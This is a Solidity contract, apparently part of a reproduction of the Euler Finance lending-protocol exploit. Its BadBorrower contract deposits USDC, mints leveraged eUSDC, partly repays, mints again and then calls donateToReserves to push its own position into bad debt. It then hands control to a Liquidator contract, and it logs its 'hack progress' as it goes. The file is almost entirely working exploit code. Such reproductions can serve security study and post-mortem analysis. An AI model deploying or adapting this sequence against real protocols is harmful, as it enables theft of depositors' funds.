// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { EthereumTokens } from "../src/tokens/Tokens.sol";

import "../interfaces/IDToken.sol";
import "../interfaces/IEToken.sol";
import { Liquidator } from "./Liquidator.sol";
import { EulerProtocol } from "../attack.sol";

import "../console/console.sol";

contract BadBorrower {
   Liquidator liquidator;

    constructor() {
        liquidator = new Liquidator();
    }

    function generateBadLoan(
        address coordinator,
        uint256 initialBalance,
        uint256 mintAmount,
        uint256 donateAmount
    ) external {
        
        EthereumTokens.USDC.approve(EulerProtocol.euler, type(uint256).max);

        EulerProtocol.eUSDC.deposit(0, (2 * initialBalance / 3) * 10**6);
        EulerProtocol.eUSDC.mint(0, mintAmount * 10**6);
        EulerProtocol.dUSDC.repay(0, (initialBalance / 3) * 10**6);
        EulerProtocol.eUSDC.mint(0, mintAmount * 10**6);
        
        EulerProtocol.eUSDC.donateToReserves(0, donateAmount * 10**EulerProtocol.eUSDC.decimals());

        console.log();
        console.log("[Hack Progress] | Generated bad loan...");
        console.log(
            "\t[Borrower] Collateral: %d eUSDC | Debt: %d dUSDC",
            EulerProtocol.eUSDC.balanceOf(address(this)) / 10**EulerProtocol.eUSDC.decimals(),
            EulerProtocol.dUSDC.balanceOf(address(this)) / 10**EulerProtocol.dUSDC.decimals()
        );
        console.log();

        // Pass execution to the liquidator
        liquidator.liquidate(
            coordinator,
            initialBalance
        );
    }
}